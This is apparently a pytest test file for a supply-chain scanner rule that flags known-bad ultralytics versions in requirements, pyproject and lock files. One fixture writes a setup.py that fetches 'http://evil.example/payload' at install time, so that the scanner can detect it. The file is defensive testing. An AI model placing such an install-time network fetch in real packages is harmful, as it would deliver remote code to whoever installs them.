from pathlib import Path

from guardana.core.rule import RuleContext
from guardana.core.target import ArtifactTarget
from guardana.rules.supply_chain.malicious_dependency import MaliciousDependencyRule


def _findings(tmp_path: Path) -> list[tuple[str, str]]:
    rule = MaliciousDependencyRule()
    return [
        (f.severity.name, f.evidence.summary)
        for f in rule.run(ArtifactTarget(tmp_path), RuleContext())
    ]


def test_flags_known_bad_version_in_requirements(tmp_path: Path) -> None:
    (tmp_path / "requirements.txt").write_text("numpy==1.26.0\nultralytics==8.3.41\n")
    findings = _findings(tmp_path)
    assert len(findings) == 1
    assert findings[0][0] == "HIGH"
    assert "ultralytics" in findings[0][1]


def test_flags_known_bad_version_in_pyproject(tmp_path: Path) -> None:
    (tmp_path / "pyproject.toml").write_text('dependencies = ["ultralytics==8.3.45"]\n')
    assert any("ultralytics" in s for _, s in _findings(tmp_path))


def test_flags_known_bad_version_in_a_poetry_style_lockfile(tmp_path: Path) -> None:
    # poetry.lock / uv.lock / pdm.lock put name and version on separate lines in a
    # [[package]] block — the authoritative pin. A same-line-only scan missed them.
    (tmp_path / "poetry.lock").write_text(
        '[[package]]\nname = "numpy"\nversion = "1.26.0"\n\n'
        '[[package]]\nname = "ultralytics"\nversion = "8.3.41"\ndescription = "x"\n',
        encoding="utf-8",
    )
    findings = _findings(tmp_path)
    assert len(findings) == 1
    assert findings[0][0] == "HIGH"
    assert "ultralytics" in findings[0][1]


def test_safe_version_of_a_watched_package_is_clean(tmp_path: Path) -> None:
    (tmp_path / "requirements.txt").write_text("ultralytics==8.3.200\n")
    assert _findings(tmp_path) == []


def test_a_longer_version_sharing_a_bad_prefix_is_not_flagged(tmp_path: Path) -> None:
    # 8.3.410 is a different, innocent release; a substring test wrongly matched
    # the known-bad 8.3.41 inside it.
    (tmp_path / "requirements.txt").write_text("ultralytics==8.3.410\n", encoding="utf-8")
    assert _findings(tmp_path) == []


def test_safe_version_in_a_lockfile_block_is_clean(tmp_path: Path) -> None:
    (tmp_path / "uv.lock").write_text(
        '[[package]]\nname = "ultralytics"\nversion = "8.3.200"\n', encoding="utf-8"
    )
    assert _findings(tmp_path) == []


def test_unrelated_dependencies_are_clean(tmp_path: Path) -> None:
    (tmp_path / "requirements.txt").write_text("numpy==1.26.0\ntorch==2.2.0\n")
    assert _findings(tmp_path) == []


def test_flags_network_fetch_in_setup_py(tmp_path: Path) -> None:
    (tmp_path / "setup.py").write_text(
        "from urllib.request import urlopen\nurlopen('http://evil.example/payload')\n",
        encoding="utf-8",
    )
    findings = _findings(tmp_path)
    assert len(findings) == 1
    assert findings[0][0] == "MEDIUM"
    assert "setup.py" in findings[0][1].lower() or "install-time" in findings[0][1]


def test_plain_setup_py_is_clean(tmp_path: Path) -> None:
    (tmp_path / "setup.py").write_text(
        "from setuptools import setup\nsetup(name='x', version='1.0')\n", encoding="utf-8"
    )
    assert _findings(tmp_path) == []
